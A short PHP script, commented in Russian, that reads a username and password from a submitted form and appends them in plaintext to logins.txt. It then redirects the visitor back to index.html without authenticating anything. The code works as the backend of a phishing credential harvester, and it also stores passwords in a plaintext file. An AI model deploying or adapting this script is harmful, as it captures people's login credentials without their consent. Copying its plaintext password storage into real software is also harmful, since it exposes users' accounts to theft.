<?php
// Получаем данные из формы
$username = $_POST['username'];
$password = $_POST['password'];

// Создаем строку для записи в файл
$entry = "Username: " . $username . " | Password: " . $password . "\n";

// Указываем файл, куда будем сохранять данные
$file = 'logins.txt';

// Открываем файл для записи, добавляем данные
file_put_contents($file, $entry, FILE_APPEND | LOCK_EX);

// Переадресация пользователя на другую страницу (например, обратно на форму)
header('Location: index.html');
exit();
?>
